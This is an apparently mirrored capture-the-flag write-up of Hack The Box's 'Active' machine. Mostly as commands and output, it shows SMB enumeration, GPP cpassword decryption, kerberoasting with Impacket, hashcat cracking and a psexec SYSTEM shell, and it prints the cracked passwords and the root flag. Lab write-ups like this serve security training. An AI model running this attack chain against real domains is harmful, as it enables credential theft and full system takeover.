# :game_die: Hacking Active on Hack the Box: A Step-By-Step OSCP Journey

> **Original Source:** [Hacking Active on Hack the Box: A Step-By-Step OSCP Journey](https://infosecwriteups.com/hacking-active-on-hack-the-box-a-step-by-step-oscp-journey-52e2b106555d)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

Once more, we’re embarking on an exploration of an Active Directory machine, and our target now is Active. While this machine presents a direct challenge, it’s pivotal in acquainting us with core Active Directory assault techniques. It’s a practical phase, laying the groundwork for the stringent tests inherent in the OSCP preparation. Our strategy transcends mere attack; it involves a deep dive into, thorough analysis of, and mastery over the tactics that shape the cybersecurity domain. This task is not merely a preliminary exercise but a critical building block in our path to achieving heightened expertise in cybersecurity.


*Active Directory Digital Landscape*


We kick things off with a basic nmap scan:


```
nmap 10.129.34.246
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-24 14:47 EDT [5/9]
Nmap scan report for 10.129.34.246
Host is up (0.12s latency).
Not shown: 982 closed tcp ports (reset)
PORT STATE SERVICE
53/tcp open domain
88/tcp open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap
445/tcp open microsoft-ds
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
49152/tcp open unknown
49153/tcp open unknown
49154/tcp open unknown
49155/tcp open unknown
49157/tcp open unknown
49158/tcp open unknown
49165/tcp open unknown

Nmap done: 1 IP address (1 host up) scanned in 15.82 seconds
```


The initial nmap scan has uncovered several ports indicative of a Windows environment, including LDAP on port 389, MSRPC on port 135, Kerberos on port 88, and Microsoft-DS on port 445. To glean deeper insights, I’ll execute a more thorough nmap scan targeting these specific ports, utilizing scripts to extract detailed information and potentially uncover vulnerabilities or misconfigurations.


```
```
sudo nmap -sC -sV 10.129.34.246 -p 53,88,135,139,389,445,464,593,636,3268,3269

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-24 14:51 EDT
Nmap scan report for 10.129.34.246
Host is up (0.12s latency).

PORT STATE SERVICE VERSION
53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-24 18:51:44Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
| 2:1:0:
|_ Message signing enabled and required
|_clock-skew: 1s
| smb2-time:
| date: 2024-03-24T18:51:53
|_ start_date: 2024-03-24T18:08:34

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.52 seconds
```
```


Confirmed, it’s a Windows Server 2008 R2 SP1 system, just as we anticipated. Now, it’s time to escalate our reconnaissance, focusing more sharply on this specific environment. We’ll deploy targeted techniques to unearth vulnerabilities, configurations, and services that could be exploited. This phase is critical in crafting a precise attack vector.


We will start with enum4linux


```
enum4linux -a 10.129.34.246
```


We get some interesting output, confirming some SMB shares:


```
Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
C$ Disk Default share
IPC$ IPC Remote IPC
NETLOGON Disk Logon server share
Replication Disk
SYSVOL Disk Logon server share
Users Disk
```


The full output of the tool shows we may have some read access on the Replication share. Let’s run another tool and see if we find anything else. This time lets use smbmap


```
smbmap -H 10.129.34.246 -r
```


*The -H flag is for “host” which is followed by the IP address, the -r flag is for “recursive” which allows the tool to search into each fileshare and show us whats inside:*


```
smbmap -H 10.129.34.246 -r

________ ___ ___ _______ ___ ___ __ _______
/" )|" \ /" || _ "\ |" \ /" | /""\ | __ "\
(: \___/ \ \ // |(. |_) :) \ \ // | / \ (. |__) :)
\___ \ /\ \/. ||: \/ /\ \/. | /' /\ \ |: ____/
__/ \ |: \. |(| _ \ |: \. | // __' \ (| /
/" \ :) |. \ /: ||: |_) :)|. \ /: | / / \ \ /|__/ \
(_______/ |___|\__/|___|(_______/ |___|\__/|___|(___/ \___)(_______)

SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.34.246:445 Name: 10.129.34.246 Status: Authenticated
Disk Permissions Comment
---- ----------- -------
ADMIN$ NO ACCESS Remote Admin
C$ NO ACCESS Default share
IPC$ NO ACCESS Remote IPC
NETLOGON NO ACCESS Logon server share
Replication READ ONLY
./Replication
dr--r--r-- 0 Sat Jul 21 06:37:44 2018 .
dr--r--r-- 0 Sat Jul 21 06:37:44 2018 ..
dr--r--r-- 0 Sat Jul 21 06:37:44 2018 active.htb
SYSVOL NO ACCESS Logon server share
Users
```


With access to the Replication share confirmed, our next step is to search its contents. We're searching for valuable data—credentials, configuration details and files, or sensitive information—that could be exploited, random notes from employees or users. As we sift through files looking for anything that might strengthen our foothold or reveal the network's vulnerabilities.


We will connect using smbclient:


```
smbclient //10.129.34.246/Replication -N
```


*The -N flag means “no-pass or no password”.*


```
└─$ smbclient //10.129.34.246/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
. D 0 Sat Jul 21 06:37:44 2018
.. D 0 Sat Jul 21 06:37:44 2018
active.htb D 0 Sat Jul 21 06:37:44 2018

5217023 blocks of size 4096. 278370 blocks available
```


Time to take a look inside “active.htb”.


To navigate these file shares, you can type “help” which gives you the basic commands. Essentially we’re using “cmd prompt” commands, where “dir” replaces the linux version of “ls” to list out files and folders in your current working directory.


After some digging through the files and folders, we come across something interesting finally: “Groups.xml”. I’ll use “get Groups.xml” command to download this and examine it on our attack machine.


```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> cd Groups
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> dir
. D 0 Sat Jul 21 06:37:44 2018
.. D 0 Sat Jul 21 06:37:44 2018
Groups.xml A 533 Wed Jul 18 16:46:06 2018

5217023 blocks of size 4096. 277698 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
```


Discovering a username “SVC_TGS” along with a cpassword hash is a significant find. The cpassword hash is typically associated with Group Policy Preferences (GPP) and can often be decrypted due to the well-known AES key Microsoft used, which is publicly available.


```
└─$ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```


I searched and found a couple of articles that dive deep into the mechanics of decrypting the “cpassword” from Group Policy Preferences files:


- There’s a breakdown on [infinitelogins.com](https://infinitelogins.com/2020/09/07/cracking-group-policy-preferences-file-gpp-xml/) that walks through the decryption process, step by meticulous step.

- Then, [adsecurity.org](https://adsecurity.org/?p=2288) offers a detailed exposition, shedding light on the nuances of this vulnerability.


These pieces are more than just tutorials; they’re blueprints for piercing through the veil of encryption, exploiting a well-known but still glaring flaw in Microsoft’s design. They’re essential for anyone looking to leverage this particular chink in the armor of a supposedly secure system.


The following is an excerpt:
“*However, if you come across an old GPP XML file, you may be able to extract a password hash from it. The file is typically found at path similar to the one shown below.`\hostname.domain\Policies\{00000000–0000–0000–0000–00000000000}\MACHINE\Preferences\Groups\Groups.xml`*


## Get enigma_’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


*As an example, we found a file on Active at *[Hack The Box](https://hacktheboxltd.sjv.io/19ZM06)* that looks like the following. Within Line 2, there is a cpassword hash that we can extract.|1<br><br>2<br><br>3|`<?``xml` `version``=``”1.0"` `encoding``=``”utf-8"``?>`<br><br>`<``Groups` `clsid``=``”{3125E937-EB16–4b4c-9934–544FC6D24D26}”``><``User` `clsid``=``”{DF5F1855–51E5–4d24–8B1A-D9BDE98BA1D1}”` `name``=``”active.htb\SVC_TGS”` `image``=``”2"` `changed``=``”2018–07–18 20:46:06"` `uid``=``”{EF57DA28–5F69–4530-A59E-AAB58578219D}”``><``Properties` `action``=``”U”` `newName``=``””` `fullName``=``””` `description``=``””` `cpassword``=``”edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ”` `changeLogon``=``”0"` `noChange``=``”1"` `neverExpires``=``”1"` `acctDisabled``=``”0"` `userName``=``”active.htb\SVC_TGS”``/></``User``>`<br><br>`</``Groups``>`|If we extract that password, we can use a tool to crack it.`gpp-decrypt <hash>`Note: If you don’t have this tool, you can download it with the following command: `sudo apt install gpp-decrypt`*"


Let’s try this out and see what we get from the cpassword hash:


```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```


Works instantly and we get our password for a foothold.


With the password “GPPstillStandingStrong2k18” in hand, our next step is kerberoasting. This technique targets the Kerberos protocol, specifically aiming to extract service account credentials. We’ll use this password to request service tickets, which can then be cracked offline to potentially uncover more passwords, possibly linked to accounts with elevated privileges.


Kerberoasting allows us to methodically identify and exploit weaknesses in the way Kerberos handles service tickets, giving us a strategic advantage. It’s a precise approach, focusing on extracting valuable data while minimizing noise and avoiding detection. This step is crucial in our penetration testing process, providing a pathway to deeper access and insight into the network’s security posture.


The tool we use for kerberoasting is “GetUserSPNs.py” which is part of the Impacket python toolkit.


```
$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.34.246 -request
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation
-------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ----------
active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2024-03-24 14:09:25.136924

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1dfe07d44e5eff546f413c3afd60d049$70e6e0a752a4aeb17a4d08d389db729c6c01d046db23cb8488623cab9efa485028e1b33a990c6ed11abdf08ba7d6edbbec92e90579b0bc33fbd1048deb9763c19d35
25cc8235b88f77bbac547a9f6fbb0ff8ccf3d592ef145a7a66dce4db5574d495c6f5501450034e6e352532898ea75bdd38797733cd914d784d294a9dbf900afcad81082898747f8459a79c864eae20ae6184055870320dc29e94e7ce5e519345ab7b61f48a6903974403fd33ee78564ddb06e
ed4c06678d32b0e162dd6778845aa18b4b8171e4845c3168af80d6415c0b98352a743b079b7bc368426aeadb23d30c46d9aa56540dbb397c4656cc0e130e83e575c7b04925aacbda95405a55a1ed1374346133d764ab2037a8375cfb9ef7761accebc021a10fe50216b28f93cea06aa9316d6
ad6e75c13c42d7ffbb16a2adb18cc06f9fe272affa83bcea81f992c8335b83b4d10b35a0ac0aec4f6e06ead39c833f938e57790c780b2fe4af69c2c4d4fad5b8cd196b506b898a4e6778349913c370061bbc9029a2c1c8259a8853410b4ad7157fcd7976724580d17411925f6e960950e070c
cffd5feb2c047b90e25aeb69664bf937aa9c7f89483c7203c79f2ba2e1257bd94030e3dea3abcb152f7838b87c9b219a3b8cb36fdd67b21578f571ff80f1cfb9c58dcf66b8950c6aa2196bf068562a1550b9a0555f41e316d89515cbe749c8a58b47010023764f49e47e8ff86df4746897866
916316fbb84c54aa1245adc39c66b98055dc2f4700237ca5635e35c347cf9a2ee9834f8664d0c54cf29497ff2b53873395f43330db3f7818fc5e4ac2e08bee6b128ca0d565c5c6ccb431d65a33b66431ea6eeb0639e98dfa9eaa54b5264798d847c8201fc477147068dc108435ef4d2cbec41
da100b671d6094ac913a94221a99ad15d189d970bcf6dff6ae90456dba4f79cad6bc869620cd407a8c6582658f7424061569cdea9e4dbb8a378179fdd3f418563228c0857a250590e6542550e6a6f18a00d079637a2a25d464c0682057b2b3b39fd3a89da11376ba66147d5518be24f8718a9
1ca4539b663699596e035ddb5a467ad55c5fdc7066a1a6e9ab343270da11270993e9ebe1baebea84c34c53952065cee439489decff63533796b1cf9dafd660721e5416a401d8c0cd3f742d777cad4fb3e8f438dfad27827dde1ae47ab4c2d0ea3bb69ca0b6d644928ff1afde9020c8eaa1aca
d3fe2881530b19b80c16544366d3210c2997e0caad089
```


And just that, we have obtained the Administrator password hash. Our very next step is to attempt to crack this hash using Hashcat.


First we need to find the hashcat code for the hash type. Since we know it’s kerberos, I like to use the following to narrow it down:


```
hashcat -h | grep Kerberos
```


We choose 13100, because in the hash description at the very beginning we see:


```
$krb5tgs$23$
```


So, I’ll use good old ‘rockyou.txt’ wordlist to crack this with the following command:


```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```


```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$891b056c46ef5bebb2a00d75ca25bef7$6d4a146f8d5f8381ac650bdae8d3578f6f9c331765f3377f071781fddbaf98ca3841835b4699da268ccb509cf68163d2fd295d350e102667f448c402612c7a5376c2
49b2427abb7f1a6ac818d400ee641628247345644dbed937b7c9a5133c533b746ebe4685ca03f9c355e7d01a39a3b487cd63dff286e3215b4499cf77b230bb5b4d694d5b5e3d99afb8108e876743c5a72655dcc56de95e9eb760c4f5bef515d79f10c68cf80bc3f782926d0f1c90b7b92854d
b5a9e739065638eaf0c88567dd617c52fe46501b45b2818cf0ac95cf42db5a7b025adc9a4ab0ca21e938082db52cb9c13c857871db0864082ff2cc89c5b001aedd2bfac2904f49bc1cd32676a96d48025980f4adbce8afc4d9e8d0ee729bff8a57b8bf56510347a1879a16b5eeb2ffce501c6
7158e351eb027fd8414339ba0918e773bcfe5de596ed656120c33c672e528e0be9e67b057794abd53fda8b7ea392290f3ee3163a5ca281042f93778176aeea29216cb35b973deb1e4579464574419ace1255bec89397d74f81169cba7bb1e9dd3cdb63b1355ab142a5dbb3df5665eafc658b2
0b168adb3a13b2e22719dee9de952716e6399272e2e4ee17788170bdb5a7de36a7e09edd55dfb06906d3142a32fb2095af739c46e7618a3c54227d39454ec095d3d974200242d21b9d097b73c737710a6fd58f254d12beb6dab334b7f92a35dbc9a834092e98ee49eefffa5b7105ef8a5bb6e
8aa4834d99dcba6779edca5889f7fea8f9c8a015819849cf11dd943a8fdfeee4d52741bb6f3970216301d9189feaaa3dcd9ed2240b72be38dac0e8e293553528ed6a0c57a5de60c4ad6cdafe8d40b1dc428a92ff2f8d6ca9bfa6fcc76875b0db7b0e780b4d6f63a809a050e4f1c31ae287161
3584f6da226bddb38d1d3f466623f7a764063384078bcf77581c4166f5c75159c45ac996291a926f07432cb9ff71ccea1781ee80ba5c5a016a0cb936b48c2ea905dd88921ab2a49ffb59097d2508782de8eee8c02d3c602cea070eb8ce9595d1b1e6751e98949726e61362b85cf811351d050
8d9ee53df6b575cc1e714ff184aa01a963bfe26c2dde27b5e8e0466f99f458ed163f4f0a8cbbd9efb095ca10fe73a3909e7483bc4ee59ef7d9c2091474d0776b34f4c2f6da8c394afd1a6341927b1a3317e5de3a1394de11fb440936506b453336ee0c0e8fa6c6a45ef19fac0c31ecf615f34
20e81fda66f2ee7a65d7fbf0f73c4dc6bf63e7dc2a0b3:Ticketmaster1968
```


We have our admin credentials:


Username: Administrator


Password: Ticketmaster1968


The final step is to try to gain shell access and find our flags. For this, we can keep it simple with psexec.py.


```
─$ psexec.py active/Administrator:'Ticketmaster1968'@10.129.34.246
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.34.246.....
[*] Found writable share ADMIN$
[*] Uploading file aveezViS.exe
[*] Opening SVCManager on 10.129.34.246.....
[*] Creating service ftLj on 10.129.34.246.....
[*] Starting service ftLj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```


We have full control of this system now as Administrator. We can grab both user and root flags easily now:


```
cd C:\Users\Administrator\Desktop
C:\Windows\system32>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
Volume in drive C has no label.
Volume Serial Number is 15BB-D59C

Directory of C:\Users\Administrator\Desktop

21/01/2021 06:49 úú <DIR> .
21/01/2021 06:49 úú <DIR> ..
24/03/2024 08:09 úú 34 root.txt
1 File(s) 34 bytes
2 Dir(s) 1.071.534.080 bytes free


C:\Users\Administrator\Desktop>type root.txt
edd6e9ea85479f05bdf6e814a4b42d7c
```


Mission accomplished.


We learned how to use enum4linux, smbmap, smbclient to access smb shares and gain valuable account information to gain a foothold. From here, we leveraged those credentials to escalate our privileges up to Administrator via a kerberoasting attack which gave us full control over the system and access to the root directory.


Until next time.

---

*Originally published on [Medium](https://infosecwriteups.com/hacking-active-on-hack-the-box-a-step-by-step-oscp-journey-52e2b106555d). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
